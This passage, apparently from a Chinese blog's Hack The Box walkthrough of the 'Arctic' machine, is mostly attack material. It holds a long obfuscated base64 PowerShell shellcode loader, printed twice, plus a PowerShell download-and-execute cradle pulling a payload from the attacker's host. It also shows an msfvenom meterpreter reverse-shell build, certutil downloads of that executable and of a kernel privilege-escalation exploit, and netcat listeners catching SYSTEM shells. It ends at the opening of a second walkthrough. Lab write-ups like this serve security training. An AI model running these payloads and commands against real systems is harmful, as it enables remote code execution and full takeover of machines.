0AZAA2ACwAfQAzADEALAB9AGMAMAAsAH0AYwAxACwAfQBjAGYALAB9ADAAZAAsAH0AYQBjACwAfQAwADEALAB9AGMANwAsAH0AMwA4ACwAfQBlADAALAB9ADcANQAsAH0AZgA0ACwAfQAwADMALAB9ADcAZAAsAH0AZgA4ACwAfQAzAGIALAB9ADcAZAAsAH0AMgA0ACwAfQA3ADUALAB9AGUAMAAsAH0ANQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgA0ACwAfQAwADEALAB9AGQAMwAsAH0ANgA2ACwAfQA4AGIALAB9ADAAYwAsAH0ANABiACwAfQA4AGIALAB9ADUAOAAsAH0AMQBjACwAfQAwADEALAB9AGQAMwAsAH0AOABiACwAfQAwADQALAB9ADgAYgAsAH0AMAAxACwAfQBkADAALAB9ADgAOQAsAH0ANAA0ACwAfQAyADQALAB9ADIANAAsAH0ANQBiACwAfQA1AGIALAB9ADYAMQAsAH0ANQA5ACwAfQA1AGEALAB9ADUAMQAsAH0AZgBmACwAfQBlADAALAB9ADUAOAAsAH0ANQBmACwAfQA1AGEALAB9ADgAYgAsAH0AMQAyACwAfQBlADkALAB9ADgAMAAsAH0AZgBmACwAfQBmAGYALAB9AGYAZgAsAH0ANQBkACwAfQA2ADgALAB9ADMAMwAsAH0AMwAyACwAfQAwADAALAB9ADAAMAAsAH0ANgA4ACwAfQA3ADcALAB9ADcAMwAsAH0AMwAyACwAfQA1AGYALAB9ADUANAAsAH0ANgA4ACwAfQA0AGMALAB9ADcANwAsAH0AMgA2ACwAfQAwADcALAB9ADgAOQAsAH0AZQA4ACwAfQBmAGYALAB9AGQAMAAsAH0AYgA4ACwAfQA5ADAALAB9ADAAMQAsAH0AMAAwACwAfQAwADAALAB9ADIAOQAsAH0AYwA0ACwAfQA1ADQALAB9ADUAMAAsAH0ANgA4ACwAfQAyADkALAB9ADgAMAAsAH0ANgBiACwAfQAwADAALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAYQAsAH0ANgA4ACwAfQAwAGEALAB9ADAAYQAsAH0AMQAwACwAfQAwADQALAB9ADYAOAAsAH0AMAAyACwAfQAwADAALAB9ADEANQAsAH0AYgAzACwAfQA4ADkALAB9AGUANgAsAH0ANQAwACwAfQA1ADAALAB9ADUAMAAsAH0ANQAwACwAfQA0ADAALAB9ADUAMAAsAH0ANAAwACwAfQA1ADAALAB9ADYAOAAsAH0AZQBhACwAfQAwAGYALAB9AGQAZgAsAH0AZQAwACwAfQBmAGYALAB9AGQANQAsAH0AOQA3ACwAfQA2AGEALAB9ADEAMAAsAH0ANQA2ACwAfQA1ADcALAB9ADYAOAAsAH0AOQA5ACwAfQBhADUALAB9ADcANAAsAH0ANgAxACwAfQBmAGYALAB9AGQANQAsAH0AOAA1ACwAfQBjADAALAB9ADcANAAsAH0AMABjACwAfQBmAGYALAB9ADQAZQAsAH0AMAA4ACwAfQA3ADUALAB9AGUAYwAsAH0ANgA4ACwAfQBmADAALAB9AGIANQAsAH0AYQAyACwAfQA1ADYALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAMAAsAH0ANgBhACwAfQAwADQALAB9ADUANgAsAH0ANQA3ACwAfQA2ADgALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADgAYgAsAH0AMwA2ACwAfQA2AGEALAB9ADQAMAAsAH0ANgA4ACwAfQAwADAALAB9ADEAMAAsAH0AMAAwACwAfQAwADAALAB9ADUANgAsAH0ANgBhACwAfQAwADAALAB9ADYAOAAsAH0ANQA4ACwAfQBhADQALAB9ADUAMwAsAH0AZQA1ACwAfQBmAGYALAB9AGQANQAsAH0AOQAzACwAfQA1ADMALAB9ADYAYQAsAH0AMAAwACwAfQA1ADYALAB9ADUAMwAsAH0ANQA3ACwAfQA2ADg'+'ALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADAAMQAsAH0AYwAzACwAfQAyADkALAB9AGMANgAsAH0ANwA1ACwAfQBlAGUALAB9AGMAMwAiADsAJABrAEoAPQBBAGQAZAAtAFQAeQBwAGUAIAAtAHAAYQBzAHMAIAAtAG0AIAAkAHAATAAgAC0ATgBhAG0AZQAgACIAbQBzACIAIAAtAG4AYQBtAGUAcwAgAEkAYgBFADsAJABrAEoAPQAkAGsASgAuAHIAZQBwAGwAYQBjAGUAKAAiAEkAYgBFACIALAAgACIAVwBpAG4AMwAyAEYAdQBuACIAKwAiAGMAIgArACIAdABpAG8AbgBzACIAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAFMATwAgAD0AIAAkAFMATwAuAHIAZQBwAGwAYQBjAGUAKAAiAH0AIgAsACIAdwBpAFIAeAAiACkALgByAGUAcABsAGEAYwBlACgAIgB3AGkAUgAiACwAIAAiADAAIgApAC4AUwBwAGwAaQB0ACgAIgAsACIAKQA7ACQAQgBnAD0AMAB4ADEAMAAwADYAOwBpAGYAIAAoACQAUwBPAC4ATAAgAC0AZwB0ACAAMAB4ADEAMAAwADYAKQB7ACQAQgBnAD0AJABTAE8ALgBMAH0AOwAkAGwAUAA9ACQAawBKADoAOgBjAGEAbABsAG8AYwAoADAAeAAxADAAMAA2ACwAIAAxACkAOwBbAFUASQBuAHQANgA0AF0AJABGAG0ATAAgAD0AIAAwADsAZgBvAHIAKAAkAEIAQQA9ADAAOwAkAEIAQQAgAC0AbABlACgAJABTAE8ALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAQgBBACsAKwApAHsAJABrAEoAOgA6AG0AZQBtAHMAZQB0ACgAWwBJAG4AdABQAHQAcgBdACgAJABsAFAALgBUAG8ASQBuAHQAMwAyACgAKQArACQAQgBBACkALAAgACQAUwBPAFsAJABCAEEAXQAsACAAMQApAH0AOwAkAGsASgA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgAJABsAFAALAAgADAAeAAxADAAMAA2ACwAIAAwAHgANAAwACwAIABbAFIAZQBmAF0AJABGAG0ATAApADsAJABZAFoASgA9AFsAaQBuAHQAXQAwAHgAMAAwADsAJABrAEoAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAWwBpAG4AdABdADAALAAkAFkAWgBKACwAJABsAFAALAAwACwAMAAsADEALQAxACkAOwAnADsAJABJAFgAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAFQARgApACkAOwAkAE4ATQA9ACIAcABvAHcAZQByAHMAaABlAGwAbAAiADsAJABIAEsAPQAiAFcAaQBuAGQAbwB3AHMAIgA7ACQAZABSAEsAIAA9ACAAIgBDADoAXAAkAEgASwBcAEIAeABTAHIAQwBMAHYAWABcACQASABLACQATgBNAFwAdgAxAC4AMABcACQATgBNACIAOwAkAGQAUgBLACAAPQAgACQAZABSAEsALgByAGUAcABsAGEAYwBlACgAIgBCAHgAUwByACIALAAgACIAcwB5AHMAIgApADsAJABkAFIASwAgAD0AIAAkAGQAUgBLAC4AcgBlAHAAbABhAGMAZQAoACIAQwBMAHYAWAAiACwAIAAiAHcAbwB3ADYANAAiACkAOwAkAHYARABWAHQAIAA9ACAAJwBUACIAKwAiAHIAIgArACIAdQBlACcAOwBpAGYAKABbAGUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBJAHMANgA0AEIAaQB0AE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtACAALQBlAHEAIAAnACQAdgBEAFYAdAAnACkAewAkAE4ATQA9ACAAJABkAFIASwB9ADsAJABiAFoAPQAiACAAJABOAE0AIABpAEoAbAB5ACAAJABJAFgAIgA7ACQAYgBaAD0AJABiAFoALgByAGUAcABsAGEAYwBlACgAIgBpAEoAbAB5ACIALAAgACIALQBuAG8AZQB4AGkAdAAgAC0AZQAiACkAOwBpAGUAeAAgACQAYgBaAA'+'==')\"\n```\n一个是 powershell 的攻击代码\n\n我们复制进去\n\n然后我们使用 msfconsole 加载 unicorn.rc\n\n```bash\n┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn]\n└─# msfconsole -r unicorn.rc \n\n\n                                   .,,.                  .\n                                .\\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P\n                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p\n                  d888888P      '7$$$$\\\"\"\"\"''^^`` .7$$$|D*\"'```         ?88'\n  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*\"`   d8P       ?8b  88P\n  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*\"`       d8P d8888b $whi?88b 88b\n d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*\" ?88,.d88b, d88 d8P' ?88 88P `?8b\nd88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*\"`    `?88'  ?88 ?88 88b  d88 d88\n                          .a#$$$$$$\"`          88b  d8P  88b`?8888P'\n                       ,s$$$$$$$\"`             888888P'   88n      _.,,,ass;:\n                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'\n                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'\n              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'\n           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--\"\"''^^/$$$$$$'\n_______________________________________________________________   ,&$$$$$$'_____\n                                                                 ll&&$$$$'\n                                                              .;;lll&&&&'\n                                                            ...;;lllll&'\n                                                          ......;;;llll;;;....\n                                                           ` ......;;;;... .  .\n\n       =[ metasploit v6.0.45-dev                          ]\n+ -- --=[ 2134 exploits - 1139 auxiliary - 364 post       ]\n+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]\n+ -- --=[ 8 evasion                                       ]\n\nMetasploit tip: Save the current environment with the \nsave command, future console restarts will use this \nenvironment again\n\n[*] Processing unicorn.rc for ERB directives.\nresource (unicorn.rc)> use multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nresource (unicorn.rc)> set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nresource (unicorn.rc)> set LHOST 10.10.16.4\nLHOST => 10.10.16.4\nresource (unicorn.rc)> set LPORT 5555\nLPORT => 5555\nresource (unicorn.rc)> set ExitOnSession false\nExitOnSession => false\nresource (unicorn.rc)> set AutoVerifySession false\nAutoVerifySession => false\nresource (unicorn.rc)> set AutoSystemInfo false\nAutoSystemInfo => false\nresource (unicorn.rc)> set AutoLoadStdapi false\nAutoLoadStdapi => false\nresource (unicorn.rc)> exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] Started reverse TCP handler on 10.10.16.4:5555\n```\n```bash\n┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn]\n└─# cat powershell_attack.txt|xclip\n```\n把 poweshell 的攻击脚本复制到剪切板\n\n```bash\npowershell /w 1 /C \"\n```\n删掉前面的内容和最后的双引号\n\n```bash\nsv PWA -;sv es ec;sv xo ((gv PWA).value.toString()+(gv es).value.toString());powershell (gv xo).value.toString() ('JABUAEYAPQAnACQAcABMAD0AJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAYwBhAGwAbABvAGMAKAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABhAG0AbwB1AG4AdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsACIAKwAiAGwAIgArACIAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbAAiACsAIgBsACIAKwAiACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABGAG0ATAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAUwBPAD0AIgB9AGUAOAAsAH0AOABmACwAfQAwADAALAB9ADAAMAAsAH0AMAAwACwAfQA2ADAALAB9ADMAMQAsAH0AZAAyACwAfQA2ADQALAB9ADgAYgAsAH0ANQAyACwAfQAzADAALAB9ADgAYgAsAH0ANQAyACwAfQAwAGMALAB9ADgAYgAsAH0ANQAyACwAfQAxADQALAB9ADgAOQAsAH0AZQA1ACwAfQAzADEALAB9AGYAZgAsAH0AOABiACwAfQA3ADIALAB9ADIAOAAsAH0AMABmACwAfQBiADcALAB9ADQAYQAsAH0AMgA2ACwAfQAzADEALAB9AGMAMAAsAH0AYQBjACwAfQAzAGMALAB9ADYAMQAsAH0ANwBjACwAfQAwADIALAB9ADIAYwAsAH0AMgAwACwAfQBjADEALAB9AGMAZgAsAH0AMABkACwAfQAwADEALAB9AGMANwAsAH0ANAA5ACwAfQA3ADUALAB9AGUAZgAsAH0ANQAyACwAfQA1ADcALAB9ADgAYgAsAH0ANQAyACwAfQAxADAALAB9ADgAYgAsAH0ANAAyACwAfQAzAGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAMAAsAH0ANwA4ACwAfQA4ADUALAB9AGMAMAAsAH0ANwA0ACwAfQA0AGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAOAAsAH0AMQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgAwACwAfQA1ADAALAB9ADAAMQAsAH0AZAAzACwAfQA4ADUALAB9AGMAOQAsAH0ANwA0ACwAfQAzAGMALAB9ADMAMQAsAH0AZgBmACwAfQA0ADkALAB9ADgAYgAsAH0AMwA0ACwAfQA4AGIALAB9ADAAMQAsAH0AZAA2ACwAfQAzADEALAB9AGMAMAAsAH0AYwAxACwAfQBjAGYALAB9ADAAZAAsAH0AYQBjACwAfQAwADEALAB9AGMANwAsAH0AMwA4ACwAfQBlADAALAB9ADcANQAsAH0AZgA0ACwAfQAwADMALAB9ADcAZAAsAH0AZgA4ACwAfQAzAGIALAB9ADcAZAAsAH0AMgA0ACwAfQA3ADUALAB9AGUAMAAsAH0ANQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgA0ACwAfQAwADEALAB9AGQAMwAsAH0ANgA2ACwAfQA4AGIALAB9ADAAYwAsAH0ANABiACwAfQA4AGIALAB9ADUAOAAsAH0AMQBjACwAfQAwADEALAB9AGQAMwAsAH0AOABiACwAfQAwADQALAB9ADgAYgAsAH0AMAAxACwAfQBkADAALAB9ADgAOQAsAH0ANAA0ACwAfQAyADQALAB9ADIANAAsAH0ANQBiACwAfQA1AGIALAB9ADYAMQAsAH0ANQA5ACwAfQA1AGEALAB9ADUAMQAsAH0AZgBmACwAfQBlADAALAB9ADUAOAAsAH0ANQBmACwAfQA1AGEALAB9ADgAYgAsAH0AMQAyACwAfQBlADkALAB9ADgAMAAsAH0AZgBmACwAfQBmAGYALAB9AGYAZgAsAH0ANQBkACwAfQA2ADgALAB9ADMAMwAsAH0AMwAyACwAfQAwADAALAB9ADAAMAAsAH0ANgA4ACwAfQA3ADcALAB9ADcAMwAsAH0AMwAyACwAfQA1AGYALAB9ADUANAAsAH0ANgA4ACwAfQA0AGMALAB9ADcANwAsAH0AMgA2ACwAfQAwADcALAB9ADgAOQAsAH0AZQA4ACwAfQBmAGYALAB9AGQAMAAsAH0AYgA4ACwAfQA5ADAALAB9ADAAMQAsAH0AMAAwACwAfQAwADAALAB9ADIAOQAsAH0AYwA0ACwAfQA1ADQALAB9ADUAMAAsAH0ANgA4ACwAfQAyADkALAB9ADgAMAAsAH0ANgBiACwAfQAwADAALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAYQAsAH0ANgA4ACwAfQAwAGEALAB9ADAAYQAsAH0AMQAwACwAfQAwADQALAB9ADYAOAAsAH0AMAAyACwAfQAwADAALAB9ADEANQAsAH0AYgAzACwAfQA4ADkALAB9AGUANgAsAH0ANQAwACwAfQA1ADAALAB9ADUAMAAsAH0ANQAwACwAfQA0ADAALAB9ADUAMAAsAH0ANAAwACwAfQA1ADAALAB9ADYAOAAsAH0AZQBhACwAfQAwAGYALAB9AGQAZgAsAH0AZQAwACwAfQBmAGYALAB9AGQANQAsAH0AOQA3ACwAfQA2AGEALAB9ADEAMAAsAH0ANQA2ACwAfQA1ADcALAB9ADYAOAAsAH0AOQA5ACwAfQBhADUALAB9ADcANAAsAH0ANgAxACwAfQBmAGYALAB9AGQANQAsAH0AOAA1ACwAfQBjADAALAB9ADcANAAsAH0AMABjACwAfQBmAGYALAB9ADQAZQAsAH0AMAA4ACwAfQA3ADUALAB9AGUAYwAsAH0ANgA4ACwAfQBmADAALAB9AGIANQAsAH0AYQAyACwAfQA1ADYALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAMAAsAH0ANgBhACwAfQAwADQALAB9ADUANgAsAH0ANQA3ACwAfQA2ADgALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADgAYgAsAH0AMwA2ACwAfQA2AGEALAB9ADQAMAAsAH0ANgA4ACwAfQAwADAALAB9ADEAMAAsAH0AMAAwACwAfQAwADAALAB9ADUANgAsAH0ANgBhACwAfQAwADAALAB9ADYAOAAsAH0ANQA4ACwAfQBhADQALAB9ADUAMwAsAH0AZQA1ACwAfQBmAGYALAB9AGQANQAsAH0AOQAzACwAfQA1ADMALAB9ADYAYQAsAH0AMAAwACwAfQA1ADYALAB9ADUAMwAsAH0ANQA3ACwAfQA2ADg'+'ALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADAAMQAsAH0AYwAzACwAfQAyADkALAB9AGMANgAsAH0ANwA1ACwAfQBlAGUALAB9AGMAMwAiADsAJABrAEoAPQBBAGQAZAAtAFQAeQBwAGUAIAAtAHAAYQBzAHMAIAAtAG0AIAAkAHAATAAgAC0ATgBhAG0AZQAgACIAbQBzACIAIAAtAG4AYQBtAGUAcwAgAEkAYgBFADsAJABrAEoAPQAkAGsASgAuAHIAZQBwAGwAYQBjAGUAKAAiAEkAYgBFACIALAAgACIAVwBpAG4AMwAyAEYAdQBuACIAKwAiAGMAIgArACIAdABpAG8AbgBzACIAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAFMATwAgAD0AIAAkAFMATwAuAHIAZQBwAGwAYQBjAGUAKAAiAH0AIgAsACIAdwBpAFIAeAAiACkALgByAGUAcABsAGEAYwBlACgAIgB3AGkAUgAiACwAIAAiADAAIgApAC4AUwBwAGwAaQB0ACgAIgAsACIAKQA7ACQAQgBnAD0AMAB4ADEAMAAwADYAOwBpAGYAIAAoACQAUwBPAC4ATAAgAC0AZwB0ACAAMAB4ADEAMAAwADYAKQB7ACQAQgBnAD0AJABTAE8ALgBMAH0AOwAkAGwAUAA9ACQAawBKADoAOgBjAGEAbABsAG8AYwAoADAAeAAxADAAMAA2ACwAIAAxACkAOwBbAFUASQBuAHQANgA0AF0AJABGAG0ATAAgAD0AIAAwADsAZgBvAHIAKAAkAEIAQQA9ADAAOwAkAEIAQQAgAC0AbABlACgAJABTAE8ALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAQgBBACsAKwApAHsAJABrAEoAOgA6AG0AZQBtAHMAZQB0ACgAWwBJAG4AdABQAHQAcgBdACgAJABsAFAALgBUAG8ASQBuAHQAMwAyACgAKQArACQAQgBBACkALAAgACQAUwBPAFsAJABCAEEAXQAsACAAMQApAH0AOwAkAGsASgA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgAJABsAFAALAAgADAAeAAxADAAMAA2ACwAIAAwAHgANAAwACwAIABbAFIAZQBmAF0AJABGAG0ATAApADsAJABZAFoASgA9AFsAaQBuAHQAXQAwAHgAMAAwADsAJABrAEoAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAWwBpAG4AdABdADAALAAkAFkAWgBKACwAJABsAFAALAAwACwAMAAsADEALQAxACkAOwAnADsAJABJAFgAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAFQARgApACkAOwAkAE4ATQA9ACIAcABvAHcAZQByAHMAaABlAGwAbAAiADsAJABIAEsAPQAiAFcAaQBuAGQAbwB3AHMAIgA7ACQAZABSAEsAIAA9ACAAIgBDADoAXAAkAEgASwBcAEIAeABTAHIAQwBMAHYAWABcACQASABLACQATgBNAFwAdgAxAC4AMABcACQATgBNACIAOwAkAGQAUgBLACAAPQAgACQAZABSAEsALgByAGUAcABsAGEAYwBlACgAIgBCAHgAUwByACIALAAgACIAcwB5AHMAIgApADsAJABkAFIASwAgAD0AIAAkAGQAUgBLAC4AcgBlAHAAbABhAGMAZQAoACIAQwBMAHYAWAAiACwAIAAiAHcAbwB3ADYANAAiACkAOwAkAHYARABWAHQAIAA9ACAAJwBUACIAKwAiAHIAIgArACIAdQBlACcAOwBpAGYAKABbAGUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBJAHMANgA0AEIAaQB0AE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtACAALQBlAHEAIAAnACQAdgBEAFYAdAAnACkAewAkAE4ATQA9ACAAJABkAFIASwB9ADsAJABiAFoAPQAiACAAJABOAE0AIABpAEoAbAB5ACAAJABJAFgAIgA7ACQAYgBaAD0AJABiAFoALgByAGUAcABsAGEAYwBlACgAIgBpAEoAbAB5ACIALAAgACIALQBuAG8AZQB4AGkAdAAgAC0AZQAiACkAOwBpAGUAeAAgACQAYgBaAA'+'==')\n```\n保存到 exploit.html\n\n```bash\n┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn]\n└─# python3 -m http.server 80                           \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n开启一个 HTTP 服务器\n\n```bash\npowershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/exploit.html')\"\n```\n在我们的 shell 里使用 powershell 下载刚才的 shell\n\n但是最后我还是失败了\n\n## 成功的方法\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Arctic]\n└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=5555 -f exe > exploit.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of exe file: 73802 bytes\n```\n使用 msfvenom 生成一个 exe 的 payload\n\n```bash\nmsf5 > use exploit/multi/handler\nmsf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp\n```\n然后在 msf 里使用上面的模块\n\n```bash\nmsf6 exploit(multi/handler) > show options \n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST                      yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n```\n然后修改一下 msf 的配置文件\n\n```bash\nmsf6 exploit(multi/handler) > show options \n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)\n   LPORT     5555             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n```\n设置好以后开始监听\n\n```bash\nmsf6 exploit(multi/handler) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:5555\n```\n```bash\ncertutil.exe -urlcache -split -f \"http://10.10.16.4/exploit.exe\" exploit.exe\n```\n使用上面的命令进行下载 exploit.exe\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.4] from (UNKNOWN) [10.10.10.11] 49738\nMicrosoft Windows [Version 6.1.7600]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\ColdFusion8\\runtime\\bin>certutil.exe -urlcache -split -f \"http://10.10.16.4/exploit.exe\" exploit.exe\ncertutil.exe -urlcache -split -f \"http://10.10.16.4/exploit.exe\" exploit.exe\n****  Online  ****\n  000000  ...\n  01204a\nCertUtil: -URLCache command completed successfully.\n```\n成功下载\n\n然后运行一下\n\n```bash\nC:\\ColdFusion8\\runtime\\bin>exploit.exe\nexploit.exe\n```\n```bash\nmsf6 exploit(multi/handler) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:5555 \n[*] Sending stage (175174 bytes) to 10.10.10.11\n[*] Meterpreter session 1 opened (10.10.16.4:5555 -> 10.10.10.11:49746) at 2022-03-24 04:31:53 -0400\n\nmeterpreter > getuid\nServer username: ARCTIC\\tolis\n```\n成功用 msf 拿到了 shell\n\n## Root\n使用 ms10-059\n\n> [https://github.91chi.fun/https://github.com/LucifielHack/windows-kernel-exploits-1.git](https://github.91chi.fun/https://github.com/LucifielHack/windows-kernel-exploits-1.git)\n\n然后使用 certutil 将我们的 Chimichurri.exe 下载进去\n\n```bash\ncertutil.exe -urlcache -split -f \"http://10.10.16.4/Chimichurri.exe\" Chimichurri.exe\n```\n然后使用 nc 监听一个端口\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 5555   \nlistening on [any] 5555 ...\n```\n```bash\nC:\\ColdFusion8\\runtime\\bin>certutil.exe -urlcache -split -f \"http://10.10.16.4/Chimichurri.exe\" Chimichurri.exe\ncertutil.exe -urlcache -split -f \"http://10.10.16.4/Chimichurri.exe\" Chimichurri.exe\n****  Online  ****\n  000000  ...\n  0bf800\nCertUtil: -URLCache command completed successfully.\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 5555   \nlistening on [any] 5555 ...\nconnect to [10.10.16.4] from (UNKNOWN) [10.10.10.11] 49208\nMicrosoft Windows [Version 6.1.7600]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\ColdFusion8\\runtime\\bin>whoami\nwhoami\nnt authority\\system\n```\n成功拿到 system 权限\n\n```bash\nC:\\Users\\Administrator\\Desktop>type c:\\users\\administrator\\desktop\\root.txt\ntype c:\\users\\administrator\\desktop\\root.txt\nfa6be5a3ab5fb06b70586f96932c3e09\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"RouterSpace - Hackthebox","url":"/2022/03/25/Hackthebox/Easy/Hackthebox-RouterSpace/","content":"\n# Hackthebox - RouterSpace\n## 靶场信息\n![](Hackthebox-RouterSpace/2bc82fdd-8cd4-45f6-a1bc-60f9391dbaee.png)\n\n## 靶场类型\n![](Hackthebox-RouterSpace/2d4257a6-2709-45f9-af71-fdcad02a3e44.png)\n\n## 信息搜集\n### Nmap\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.148\nStarting Nmap 